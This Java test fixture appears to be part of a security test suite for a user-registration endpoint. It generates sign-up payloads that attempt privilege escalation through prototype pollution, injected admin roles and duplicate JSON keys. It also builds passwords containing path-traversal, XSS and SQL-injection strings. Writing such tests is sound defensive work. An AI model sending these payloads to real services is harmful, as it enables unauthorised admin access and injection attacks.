        p.add(new JSONObject().put("username", "ma15").put("lastName", "Smith").put("firstName", "John").put("email", "ma15@example.com").put("password", "grgrbtrhrebwhnrwtn").put("__proto__", new JSONObject().put("isAdmin", true)).put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "ma16").put("lastName", "Smith").put("firstName", "John").put("email", "ma16@example.com").put("password", "grgrbtrhrebwhnrwtn").put("constructor", new JSONObject().put("prototype", new JSONObject().put("isAdmin", true))).put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "ma17").put("lastName", "Smith").put("firstName", "John").put("email", "ma17@example.com").put("password", "grgrbtrhrebwhnrwtn").put("roles", new JSONArray().put("ADMIN").put("USER")).put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "ma18").put("lastName", "Smith").put("firstName", "John").put("email", "ma18@example.com").put("password", "grgrbtrhrebwhnrwtn").put("groups", new JSONArray().put("administrators")).put("companyId", companyId).toString());

        // ============================================================
        // Scenario 22: Duplicate JSON keys (raw JSON; JSONObject would dedupe)
        // ============================================================
        p.add("{\"username\":\"alice\",\"username\":\"bob\",\"lastName\":\"Smith\",\"firstName\":\"John\",\"email\":\"dup1@example.com\",\"password\":\"grgrbtrhrebwhnrwtn\",\"companyId\":\"" + escapeJsonString(companyId) + "\"}");
        p.add("{\"username\":\"dup2\",\"lastName\":\"Smith\",\"firstName\":\"John\",\"email\":\"dup2@example.com\",\"password\":\"grgrbtrhrebwhnrwtn\",\"role\":\"USER\",\"role\":\"ADMIN\",\"companyId\":\"" + escapeJsonString(companyId) + "\"}");
        p.add("{\"username\":\"dup3\",\"lastName\":\"Smith\",\"firstName\":\"John\",\"email\":\"dup3@example.com\",\"password\":\"weak\",\"password\":\"grgrbtrhrebwhnrwtn\",\"companyId\":\"" + escapeJsonString(companyId) + "\"}");

        // ============================================================
        // Scenario 23: Reserved / system usernames
        // ============================================================
        p.add(new JSONObject().put("username", "admin").put("lastName", "Smith").put("firstName", "John").put("email", "rsv1@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "administrator").put("lastName", "Smith").put("firstName", "John").put("email", "rsv2@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "root").put("lastName", "Smith").put("firstName", "John").put("email", "rsv3@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "system").put("lastName", "Smith").put("firstName", "John").put("email", "rsv4@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());

        return p.toArray(new String[0]);
    }

    private class UserBuilder {
        private String lastName = "Smith";
        private String firstName = "John";
        private String password;
        private String email;
        private String username;
        private int sequence;

        UserBuilder(int sequence) {
            this.sequence = sequence;
            this.email = "john.smith" + sequence + "@gmail.com";
            this.username = "testUser" + sequence;
        }

        UserBuilder withPassword(String password) {
            this.password = password;
            return this;
        }

        String build() {
            return String.format("{\"lastName\":\"%s\",\"firstName\":\"%s\",\"password\":\"%s\",\"email\":\"%s\",\"username\":\"%s\",\"companyId\":\"%s\"}",
                    escapeJson(lastName), escapeJson(firstName), escapeJson(password), escapeJson(email), escapeJson(username), escapeJson(companyId));
        }

        private String escapeJson(String value) {
            if (value == null) return "";
            return value.replace("\\", "\\\\").replace("\"", "\\\"");
        }
    }

    private static String escapeJsonString(String value) {
        if (value == null) return "";
        return value.replace("\\", "\\\\").replace("\"", "\\\"");
    }

    public List<String> getUserDetailsForPasswordTesting() {
        List<String> userDetails = new ArrayList<>();
        userDetails.add(new UserBuilder(1).withPassword("").build());
        userDetails.add(new UserBuilder(2).withPassword("a").build());
        userDetails.add(new UserBuilder(4).withPassword("     ").build());
        userDetails.add(new UserBuilder(12).withPassword("a".repeat(10000)).build());
        userDetails.add(new UserBuilder(13).withPassword("\u0000\u0000\u0000").build());
        userDetails.add(new UserBuilder(14).withPassword("\u0000suffix").build());
        userDetails.add(new UserBuilder(16).withPassword("\uFEFFpassword").build());
        userDetails.add(new UserBuilder(17).withPassword("pass\u200Bword").build());
        userDetails.add(new UserBuilder(18).withPassword("😀😁😂🤣").build());
        userDetails.add(new UserBuilder(19).withPassword("../../etc/passwd").build());
        userDetails.add(new UserBuilder(20).withPassword("<script>alert(1)</script>").build());
        userDetails.add(new UserBuilder(21).withPassword("' OR '1'='1").build());

        return userDetails;
    }

}